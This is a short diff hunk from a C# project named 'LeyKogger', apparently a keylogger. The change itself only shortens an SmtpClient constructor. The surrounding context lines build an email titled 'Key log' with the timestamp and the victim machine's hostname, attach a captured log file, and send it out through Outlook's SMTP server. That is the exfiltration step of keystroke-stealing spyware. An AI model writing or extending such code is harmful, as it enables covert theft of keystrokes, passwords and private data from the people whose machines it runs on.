@@ -106,7 +106,7 @@ namespace LeyKogger
                 Subject = "Key log " + DateTime.Now.ToString() + " " + Dns.GetHostName()
             };
             message.Attachments.Add(new Attachment(path + ".att"));
-            using (SmtpClient client = new SmtpClient("smtp-mail.outlook.com"))
+            using (SmtpClient client = new("smtp-mail.outlook.com"))
             {
                 client.EnableSsl = true;
                 client.Port = 587;
